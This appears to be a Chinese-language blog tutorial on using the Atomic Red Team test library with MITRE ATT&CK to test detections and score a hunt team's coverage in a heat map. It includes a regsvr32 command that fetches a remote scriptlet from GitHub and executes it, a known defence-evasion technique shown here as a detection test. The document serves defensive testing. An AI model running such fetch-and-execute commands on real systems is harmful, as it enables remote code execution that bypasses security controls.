

[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)中所有技术均映射到[Mitre's ATT&CK](https://attack.mitre.org/wiki/Main_Page)。

Atomic Red Team是一个简单的测试库。

---

开始Atomic Test

1、选择测试
2、执行测试
3、收集证据
4、开发检测
5、衡量进度

![](https://i.imgur.com/7CDh2R0.png)

1、选择测试


[Atomic Tests完整列表](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md)

[根据ATT&CK矩阵进行Atomic Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/matrix.md)

windows [tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md)和[Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-matrix.md)

Linux [Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-index.md) and [Matrix](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/linux-matrix.md)

2、执行测试

[测试示例](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution)

```
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
```

3、收集证据

查看异常

4、开发检测

执行了测试，但没有任何防御措施触发，测试只是为了更好的做防御。

![](https://i.imgur.com/i4vZEIO.png)

建立了检测机制后，就可以去验证检测是否正常运行并适当的调整测试策略。

5、衡量进度

根据ATT&CK矩阵衡量业务的承受能力和范围，确定可能存在的差距，每个测试功能对应于MITER ATT&CK矩阵中的相应位置。

假设测试了某个模块，在ATT&CK中都有相应的参考，确定影响的大小。

[对照图](https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/resources/metrics/HuntTeam_HeatMap.xlsx)

---

通过MITER ATT&CK框架衡量Hunt Team的效率。

> powershell命令直接获取ATT&CK框架的内容

```
Invoke-ATTACKAPI -Matrix | select Persistence, 'Privilege Escalation', 'Defense Evasion','Credential Access',
Discovery, 'Lateral Movement', Execution, Collection, Exfiltration, 'Command and Control' | 
Export-Csv C:\documents\matrix.csv -NoTypeInformation
```

定义记分系统：

评分系统级别：

-  (None, Poor, Fair, Good, Very Good & Excellent)
-  设置颜色
-  颜色与评分级别一一对应

![](https://i.imgur.com/tYHMkzg.jpg)

[定义每种对抗技术](https://attack.mitre.org/techniques/enterprise/)

powershell脚本获取

```
Invoke-ATTACKAPI -Category -Technique | select @{Name="Name"; Expression={$_.Name -join ","}}, @{Name="Tactic"; Expression={$_.Tactic -join ","}}, @{Name ="ID"; Expression={$_.ID -join ","}}, @{Name="Description"; Expression={$_.Description -join ","}}, @{Name="Analytic details"; Expression={$_.'Analytic Details' -join ","}}, @{Name="Data Source"; Expression={$_.'Data Source' -join ","}}  | export-csv F:\wardog\scripts\techniques.csv -NoTypeInformation
```

整合所有的工作表


参考：

https://cyberwardog.blogspot.com/2017/07/how-hot-is-your-hunt-team.html

---

热图地址：

https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/blob/master/metrics/HuntTeam_HeatMap.xlsx 







